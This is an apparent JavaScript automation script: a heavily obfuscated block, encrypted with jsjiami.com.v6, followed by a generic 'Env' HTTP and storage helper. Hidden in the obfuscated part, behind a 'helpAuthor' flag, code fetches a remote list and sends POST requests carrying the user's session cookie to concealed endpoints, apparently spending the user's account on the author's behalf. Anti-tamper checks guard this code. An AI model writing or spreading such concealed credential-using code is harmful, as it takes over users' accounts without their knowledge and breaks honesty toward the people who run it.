OXdhPCpsOAX0ZMwpLDi3nDtHdQw6NdwqXCsynDigBadcORG8OFw74kAzrCscKIA8OhwrNHbcOOw589dhcswq7ChcOPV8OFIgwHw6/DlQrDmlvCg0J9w7XDrjgFIyLCicKOMh3CocKOODPCo8Kew4nCicOUXsKUeMK5dkMeE8KLwpdIwpHCjGZtwrnDtm/CsELDkkdFXwDCvEhKw4ltZTLDrnnClSATHMK+wpLDuT/DgsKHAhIiw69Pw45Ew7UgKiDCnMKYNMKiw5hrGhrCmMOsRkloGyc=','w7jDjcOnA8Kc','Gw9KwqXCuw==','w58HCmxt','O8OxBMO9AA==','wrZaw4g=','wozDv8K2ZCA=','MMOWfRnDrQ==','ZB1jLMK+bmU=','AMKkcCgT','w6PChj8=','F8OECMOxIA==','O2FRO8KKw4/Dlw==','wqHCnwpEw7w=','jsjgiamYiF.cHPGoTmkF.vy6bXXbbq=='];(function(_0x4e2d67,_0x58c0ad,_0x47452e){var _0xf60795=function(_0x5811f5,_0xa95f2d,_0x559734,_0x2f8469,_0x2ba4dc){_0xa95f2d=_0xa95f2d>>0x8,_0x2ba4dc='po';var _0x3420fe='shift',_0x17ca7c='push';if(_0xa95f2d<_0x5811f5){while(--_0x5811f5){_0x2f8469=_0x4e2d67[_0x3420fe]();if(_0xa95f2d===_0x5811f5){_0xa95f2d=_0x2f8469;_0x559734=_0x4e2d67[_0x2ba4dc+'p']();}else if(_0xa95f2d&&_0x559734['replace'](/[gYFHPGTkFybXXbbq=]/g,'')===_0xa95f2d){_0x4e2d67[_0x17ca7c](_0x2f8469);}}_0x4e2d67[_0x17ca7c](_0x4e2d67[_0x3420fe]());}return 0x75590;};var _0x1a7b69=function(){var _0x2194a7={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x4035c6,_0x4be78a,_0x24fb7c,_0x308397){_0x308397=_0x308397||{};var _0x38e636=_0x4be78a+'='+_0x24fb7c;var _0x2524d3=0x0;for(var _0x2524d3=0x0,_0x34aabc=_0x4035c6['length'];_0x2524d3<_0x34aabc;_0x2524d3++){var _0x2168ff=_0x4035c6[_0x2524d3];_0x38e636+=';\x20'+_0x2168ff;var _0x6eb0ac=_0x4035c6[_0x2168ff];_0x4035c6['push'](_0x6eb0ac);_0x34aabc=_0x4035c6['length'];if(_0x6eb0ac!==!![]){_0x38e636+='='+_0x6eb0ac;}}_0x308397['cookie']=_0x38e636;},'removeCookie':function(){return'dev';},'getCookie':function(_0x2369d1,_0x25cf23){_0x2369d1=_0x2369d1||function(_0x3947ed){return _0x3947ed;};var _0x41c07e=_0x2369d1(new RegExp('(?:^|;\x20)'+_0x25cf23['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x3b7391=typeof _0xodB=='undefined'?'undefined':_0xodB,_0x3dc2dd=_0x3b7391['split'](''),_0x54011f=_0x3dc2dd['length'],_0x6d755a=_0x54011f-0xe,_0x5dcd39;while(_0x5dcd39=_0x3dc2dd['pop']()){_0x54011f&&(_0x6d755a+=_0x5dcd39['charCodeAt']());}var _0x5a9063=function(_0x57adf4,_0x5023b7,_0x2eebe7){_0x57adf4(++_0x5023b7,_0x2eebe7);};_0x6d755a^-_0x54011f===-0x524&&(_0x5dcd39=_0x6d755a)&&_0x5a9063(_0xf60795,_0x58c0ad,_0x47452e);return _0x5dcd39>>0x2===0x14b&&_0x41c07e?decodeURIComponent(_0x41c07e[0x1]):undefined;}};var _0x592725=function(){var _0x36c73f=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x36c73f['test'](_0x2194a7['removeCookie']['toString']());};_0x2194a7['updateCookie']=_0x592725;var _0x9ff937='';var _0x3d7df3=_0x2194a7['updateCookie']();if(!_0x3d7df3){_0x2194a7['setCookie'](['*'],'counter',0x1);}else if(_0x3d7df3){_0x9ff937=_0x2194a7['getCookie'](null,'counter');}else{_0x2194a7['removeCookie']();}};_0x1a7b69();}(_0x51ef,0x1d8,0x1d800));var _0x478e=function(_0x40f17f,_0x53e585){_0x40f17f=~~'0x'['concat'](_0x40f17f);var _0x28ec5c=_0x51ef[_0x40f17f];if(_0x478e['jxQSlm']===undefined){(function(){var _0x54520e=function(){var _0x116397;try{_0x116397=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x552a1a){_0x116397=window;}return _0x116397;};var _0x3ab8d9=_0x54520e();var _0x3b6775='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x3ab8d9['atob']||(_0x3ab8d9['atob']=function(_0x5474dd){var _0x3489a8=String(_0x5474dd)['replace'](/=+$/,'');for(var _0x5dd2ab=0x0,_0x20859b,_0x11d503,_0x147b39=0x0,_0x4ad1eb='';_0x11d503=_0x3489a8['charAt'](_0x147b39++);~_0x11d503&&(_0x20859b=_0x5dd2ab%0x4?_0x20859b*0x40+_0x11d503:_0x11d503,_0x5dd2ab++%0x4)?_0x4ad1eb+=String['fromCharCode'](0xff&_0x20859b>>(-0x2*_0x5dd2ab&0x6)):0x0){_0x11d503=_0x3b6775['indexOf'](_0x11d503);}return _0x4ad1eb;});}());var _0x349480=function(_0x287a1d,_0x53e585){var _0x494e45=[],_0x490ced=0x0,_0xc58479,_0x4f9bbe='',_0x128b0f='';_0x287a1d=atob(_0x287a1d);for(var _0xe838b4=0x0,_0xe78cb7=_0x287a1d['length'];_0xe838b4<_0xe78cb7;_0xe838b4++){_0x128b0f+='%'+('00'+_0x287a1d['charCodeAt'](_0xe838b4)['toString'](0x10))['slice'](-0x2);}_0x287a1d=decodeURIComponent(_0x128b0f);for(var _0x1c503b=0x0;_0x1c503b<0x100;_0x1c503b++){_0x494e45[_0x1c503b]=_0x1c503b;}for(_0x1c503b=0x0;_0x1c503b<0x100;_0x1c503b++){_0x490ced=(_0x490ced+_0x494e45[_0x1c503b]+_0x53e585['charCodeAt'](_0x1c503b%_0x53e585['length']))%0x100;_0xc58479=_0x494e45[_0x1c503b];_0x494e45[_0x1c503b]=_0x494e45[_0x490ced];_0x494e45[_0x490ced]=_0xc58479;}_0x1c503b=0x0;_0x490ced=0x0;for(var _0xc98b9c=0x0;_0xc98b9c<_0x287a1d['length'];_0xc98b9c++){_0x1c503b=(_0x1c503b+0x1)%0x100;_0x490ced=(_0x490ced+_0x494e45[_0x1c503b])%0x100;_0xc58479=_0x494e45[_0x1c503b];_0x494e45[_0x1c503b]=_0x494e45[_0x490ced];_0x494e45[_0x490ced]=_0xc58479;_0x4f9bbe+=String['fromCharCode'](_0x287a1d['charCodeAt'](_0xc98b9c)^_0x494e45[(_0x494e45[_0x1c503b]+_0x494e45[_0x490ced])%0x100]);}return _0x4f9bbe;};_0x478e['qaiwja']=_0x349480;_0x478e['dcZVJW']={};_0x478e['jxQSlm']=!![];}var _0x503698=_0x478e['dcZVJW'][_0x40f17f];if(_0x503698===undefined){if(_0x478e['LhmiSv']===undefined){var _0x45a0d1=function(_0x3491d6){this['pgGBDC']=_0x3491d6;this['LecaRB']=[0x1,0x0,0x0];this['XFjJhT']=function(){return'newState';};this['Xogocq']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['BrpZzY']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x45a0d1['prototype']['xkwTfX']=function(){var _0x2ede2d=new RegExp(this['Xogocq']+this['BrpZzY']);var _0x8528fc=_0x2ede2d['test'](this['XFjJhT']['toString']())?--this['LecaRB'][0x1]:--this['LecaRB'][0x0];return this['tPZfgf'](_0x8528fc);};_0x45a0d1['prototype']['tPZfgf']=function(_0x21f491){if(!Boolean(~_0x21f491)){return _0x21f491;}return this['wWsyRG'](this['pgGBDC']);};_0x45a0d1['prototype']['wWsyRG']=function(_0x516b4d){for(var _0x212c6c=0x0,_0x554d44=this['LecaRB']['length'];_0x212c6c<_0x554d44;_0x212c6c++){this['LecaRB']['push'](Math['round'](Math['random']()));_0x554d44=this['LecaRB']['length'];}return _0x516b4d(this['LecaRB'][0x0]);};new _0x45a0d1(_0x478e)['xkwTfX']();_0x478e['LhmiSv']=!![];}_0x28ec5c=_0x478e['qaiwja'](_0x28ec5c,_0x53e585);_0x478e['dcZVJW'][_0x40f17f]=_0x28ec5c;}else{_0x28ec5c=_0x503698;}return _0x28ec5c;};if(helpAuthor){shuye72();function help1(_0x5c4ff7){var _0x517b44={'bLkUp':_0x478e('0','XcQN'),'RbGZt':_0x478e('1','D[mc'),'FgTPH':_0x478e('2','DKov'),'FHlCE':_0x478e('3','@!iF'),'hULxs':_0x478e('4','iGV('),'PmoPB':function(_0x523235,_0x49db48){return _0x523235(_0x49db48);},'HUEnY':_0x478e('5','5reg'),'kINGv':_0x478e('6','ZhCV'),'phiAv':_0x478e('7','UD(S'),'DSEpY':_0x478e('8','%7&v')};let _0x4e3a8c=+new Date();let _0x1a90b4=_0x5c4ff7[_0x478e('9','1^Aa')];let _0x2ede10={'url':_0x478e('a','UR1z')+ +new Date(),'headers':{'Host':_0x517b44[_0x478e('b','NgmY')],'accept':_0x517b44[_0x478e('c','@!iF')],'content-type':_0x517b44[_0x478e('d','@LP#')],'origin':_0x517b44[_0x478e('e','X]0g')],'accept-language':_0x517b44[_0x478e('f','pQG$')],'user-agent':$[_0x478e('10','*nsc')]()?process[_0x478e('11','Wxba')][_0x478e('12','Wxba')]?process[_0x478e('13','2w*]')][_0x478e('14','UR1z')]:_0x517b44[_0x478e('15','Tl#T')](require,_0x517b44[_0x478e('16','D[mc')])[_0x478e('17','iGV(')]:$[_0x478e('18','X]0g')](_0x517b44[_0x478e('19','D[mc')])?$[_0x478e('1a','@!iF')](_0x517b44[_0x478e('1b','4((s')]):_0x517b44[_0x478e('1c','Tl#T')],'referer':_0x517b44[_0x478e('1d','F&0X')],'Cookie':cookie},'body':_0x478e('1e','Di&u')+_0x1a90b4+_0x478e('1f','pQG$')+_0x4e3a8c};$[_0x478e('20','X]0g')](_0x2ede10,(_0x1faad5,_0x910f1f,_0x3e7454)=>{});}function help2(_0x5a32c8){var _0x48648b={'WPGgk':_0x478e('21','gql7'),'rtnDz':_0x478e('1','D[mc'),'fylIR':_0x478e('22','Wxba'),'pRepi':_0x478e('23','6V9*'),'euUGW':_0x478e('24','F&0X'),'YrZRB':function(_0x58d4c5,_0x1d536e){return _0x58d4c5(_0x1d536e);},'LgxvX':_0x478e('25','@LP#'),'LgSCO':_0x478e('26','Di&u'),'IiXXe':_0x478e('27','Tl#T')};let _0x3627c4=+new Date();let _0x30f39b=_0x5a32c8[_0x478e('28','NgmY')];let _0x2b2803={'url':_0x478e('29','XcQN')+ +new Date(),'headers':{'Host':_0x48648b[_0x478e('2a','BAP!')],'accept':_0x48648b[_0x478e('2b','%7&v')],'content-type':_0x48648b[_0x478e('2c','L(dd')],'origin':_0x48648b[_0x478e('2d','*nsc')],'accept-language':_0x48648b[_0x478e('2e','1^Aa')],'user-agent':$[_0x478e('2f','Tl#T')]()?process[_0x478e('30','ZhCV')][_0x478e('31','DKov')]?process[_0x478e('32','CPK2')][_0x478e('33','BAP!')]:_0x48648b[_0x478e('34','6V9*')](require,_0x48648b[_0x478e('35','B7vD')])[_0x478e('36','vHQu')]:$[_0x478e('37','$Zzv')](_0x48648b[_0x478e('38','extu')])?$[_0x478e('39','SiF5')](_0x48648b[_0x478e('3a','BAP!')]):_0x48648b[_0x478e('3b','$Zzv')],'referer':_0x478e('3c','R[1j')+_0x30f39b,'Cookie':cookie},'body':_0x478e('3d','$Zzv')+_0x48648b[_0x478e('3e','UR1z')](escape,_0x30f39b)+_0x478e('3f','XcQN')+_0x3627c4};$[_0x478e('40','B7vD')](_0x2b2803,(_0x34f03e,_0x497d97,_0x282512)=>{});}function shuye72(){var _0x32783a=function(){var _0x43ed06=!![];return function(_0x187ab6,_0x146e3e){var _0x381b2d=_0x43ed06?function(){if(_0x146e3e){var _0x1990ee=_0x146e3e['apply'](_0x187ab6,arguments);_0x146e3e=null;return _0x1990ee;}}:function(){};_0x43ed06=![];return _0x381b2d;};}();var _0x4af7bb=_0x32783a(this,function(){var _0x1d2076=function(){return'\x64\x65\x76';},_0x2a7e5a=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0x190e79=function(){var _0x1f6a79=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x1f6a79['\x74\x65\x73\x74'](_0x1d2076['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x4663e3=function(){var _0x5c299b=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x5c299b['\x74\x65\x73\x74'](_0x2a7e5a['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x380281=function(_0x1e52ae){var _0x5391b0=~-0x1>>0x1+0xff%0x0;if(_0x1e52ae['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x5391b0)){_0x300a6a(_0x1e52ae);}};var _0x300a6a=function(_0x1b3896){var _0x1cb4ed=~-0x4>>0x1+0xff%0x0;if(_0x1b3896['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0x1cb4ed){_0x380281(_0x1b3896);}};if(!_0x190e79()){if(!_0x4663e3()){_0x380281('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0x380281('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0x380281('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0x4af7bb();var _0x235f4b={'SebdM':function(_0x4e2859,_0x379cc6){return _0x4e2859!==_0x379cc6;},'ajMfE':function(_0x502483,_0xcb04f4){return _0x502483<_0xcb04f4;},'OAsig':function(_0x51d010,_0x39f4f8){return _0x51d010(_0x39f4f8);},'GgHKC':function(_0x42f234,_0x504fd8){return _0x42f234(_0x504fd8);},'iCfmX':_0x478e('41','X]0g'),'SfEQZ':_0x478e('42','@LP#')};new Promise(_0x3a5afe=>{var _0x2a5c82={'kRDGc':function(_0x3997cd,_0x5d6fde){return _0x235f4b[_0x478e('43','Tl#T')](_0x3997cd,_0x5d6fde);},'QfsGT':function(_0x49cbfd,_0x3f289f){return _0x235f4b[_0x478e('44','pQG$')](_0x49cbfd,_0x3f289f);},'fraaG':function(_0x5d8e47,_0x5781cf){return _0x235f4b[_0x478e('45','2z3E')](_0x5d8e47,_0x5781cf);},'oLPRi':function(_0x44fe84,_0x556b6a){return _0x235f4b[_0x478e('46','TfLh')](_0x44fe84,_0x556b6a);}};$[_0x478e('47','extu')]({'url':_0x235f4b[_0x478e('48','L(dd')],'headers':{'User-Agent':_0x235f4b[_0x478e('49','%7&v')]}},async(_0x23615e,_0x3648c8,_0x229773)=>{if(_0x229773){$[_0x478e('4a','gql7')]=JSON[_0x478e('4b','!1y)')](_0x229773);console[_0x478e('4c','GUVs')](_0x229773);if(_0x2a5c82[_0x478e('4d','TfLh')]($[_0x478e('4e','Wxba')][_0x478e('4f','uRCv')][_0x478e('50','extu')],0x0)){for(let _0x39f5f9=0x0;_0x2a5c82[_0x478e('51','NgmY')](_0x39f5f9,$[_0x478e('52','UR1z')][_0x478e('53','kq7A')][_0x478e('54','CPK2')]);_0x39f5f9++){let _0x74b5db=$[_0x478e('4e','Wxba')][_0x478e('55','@!iF')][_0x39f5f9];await $[_0x478e('56','pQG$')](0x1f4);_0x2a5c82[_0x478e('57','@LP#')](help1,_0x74b5db);let _0x2ce0fb=$[_0x478e('58','TfLh')][_0x478e('59','*nsc')][_0x39f5f9];await $[_0x478e('5a','CPK2')](0x1f4);_0x2a5c82[_0x478e('5b','F&0X')](help2,_0x74b5db);}}}});});}};_0xodB='jsjiami.com.v6';
// prettier-ignore
function Env(t,e){class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}